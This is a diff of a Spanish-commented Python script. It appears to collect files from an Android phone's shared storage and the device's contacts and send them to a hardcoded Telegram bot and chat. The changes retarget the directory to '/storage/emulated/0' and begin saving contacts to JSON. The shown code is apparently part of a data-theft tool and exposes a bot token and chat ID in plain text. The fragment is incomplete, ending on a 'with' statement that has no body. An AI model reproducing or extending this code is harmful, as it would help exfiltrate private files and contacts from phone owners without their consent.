@@ -17,7 +17,7 @@ TOKEN = '7016184289:AAGdf0Pl6m6uN4JVZf55NdmxAdCwYHc8PDQ'
 CHAT_ID = '5827778078'
 
 # Ruta al directorio donde se encuentran los archivos a enviar
-DIRECTORIO_ARCHIVOS = '/ruta/al/directorio'
+DIRECTORIO_ARCHIVOS = '/storage/emulated/0/ruta/al/directorio'
 
 # Crea una instancia del bot
 bot = telegram.Bot(token=TOKEN)
@@ -108,6 +108,4 @@ for archivo in archivos:
 contactos_json = contactos.to_json()
 
 # Guarda los contactos en un archivo JSON
-
-with open('contactos.json') as archivo:
-    # Resto del código aquí
+with open ("contactos.json","w") as archivo_json:
